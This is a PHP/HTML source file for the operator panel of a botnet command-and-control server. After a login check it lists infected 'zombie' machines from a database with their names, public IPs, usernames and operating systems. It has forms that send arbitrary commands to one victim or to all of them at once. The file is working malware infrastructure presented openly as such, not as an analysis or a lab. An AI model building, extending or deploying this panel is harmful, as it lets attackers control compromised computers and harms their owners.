<?php
session_start();

if (!isset($_SESSION["username"])) {
    header("Location: login/html"); 
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="description" content="Botnet C&C Server">
    <meta name="author" content="S12">
    <meta name="lang" content="en">
    <title>C&C Server</title>
    <link rel="stylesheet" href="style.css">
    <script src="js/index.js"></script>
</head>
<body>
    <div id="toast" class="toast"></div>
    <h1>C&C Server</h1>
    <div class="menu" style="margin-left: 14%; margin-right: 14%;">
        <form action="controller/executeAllZombies.php" method="post" style="display: inline-block;">
            <input class="commandInput" type="text" name="command" placeholder="Execute Command in All Zombies">
            <input class="button" type="submit" value="Execute" style=" background-color: white; color: black; border: 1px solid rgb(252, 184, 102);">
        </form>
        <h3 class="welcomeUser" style="color: white; margin-left: 60%; display: inline-block;">Welcome 
            <?php
                session_start();
                echo $_SESSION["username"];
            ?>
        </h3>
        <form action="controller/logout.php" method="post" style="display: inline-block;">
            <input class="btnLogout" type="submit" value="Logout" style="background-color: white; margin-top: 4%; padding: 5%; border: 2px;">
        </form>
    </div>
    <table class="zombieTable">
        <tr>
            <th>PC Name</th>
            <th>Last Status</th>
            <th>Public IP</th>
            <th>Username</th>
            <th>Operative System</th>
            <th>Remote Command Execution</th>
        </tr>
        <?php
        $db = new PDO('sqlite:/var/www/html/C2WebServer/botnet.db');
        $stmt = $db->query("SELECT pcName, stat, ip, username, os FROM zombies");
        while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
            echo "<tr>";
            echo "<td>" . $row['pcName'] . "</td>";
            echo "<td>" . $row['stat'] . "</td>";
            echo "<td>" . $row['ip'] . "</td>";
            echo "<td>" . $row['username'] . "</td>";
            echo "<td>" . $row['os'] . "</td>";
            echo "<td>";
            echo "<form action='controller/sendCommand.php' class='commandForm' method='post'>";
            echo "<input type='hidden' name='zombieIP' value='" . $row['ip'] . "'>";
            echo "<input style='border: 1px dotted #ccc;' class='commandInput' type='text' name='command' placeholder='Command'>";
            echo "<input style='margin-left: 2%; padding: 2%; background-color: white; color: black; border: 1px solid rgb(252, 184, 102); margin-left:3% ' class='button' type='submit' value='Send' id='btnSend'>";
            echo "</form>";
            echo "</td>";
            echo "</tr>";
        }
        
        ?>
    </table>
</body>
</html>
